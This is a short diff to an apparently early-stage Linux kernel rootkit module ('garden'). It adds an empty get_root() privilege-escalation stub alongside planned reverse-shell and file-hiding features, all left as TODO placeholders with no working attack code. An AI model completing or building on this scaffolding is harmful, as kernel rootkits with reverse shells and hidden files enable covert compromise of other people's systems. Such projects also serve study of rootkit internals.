@@ -69,6 +69,13 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 }
 
 /**
+ * Gives the current user root priveleges.
+ **/
+static void get_root() {
+    // TODO
+}
+
+/**
  * Rootkit module initialization.
  */
 static int __init rootkit_init(void) {
@@ -76,13 +83,21 @@ static int __init rootkit_init(void) {
     khook_init();
 
     while (true) {
-        // TODO: Check on /sys/module/garden/parameters/<PARAM> to see if it's changed since last check. Set up polling.
+        /**
+         * TODO: Check on /sys/module/garden/parameters/<PARAM> to see if it's changed since last check.
+         * This change should theoretically be reflected in the global variable.
+         **/
+
         if (rev_shell_ip) {
             // TODO: Set up reverse shell.
         }
 
         if (hidden_file_prefix) {
             // TODO: Set up hidden files.
+        }
+
+        if (escalate_privileges) {
+            get_root();
         }
     }
 
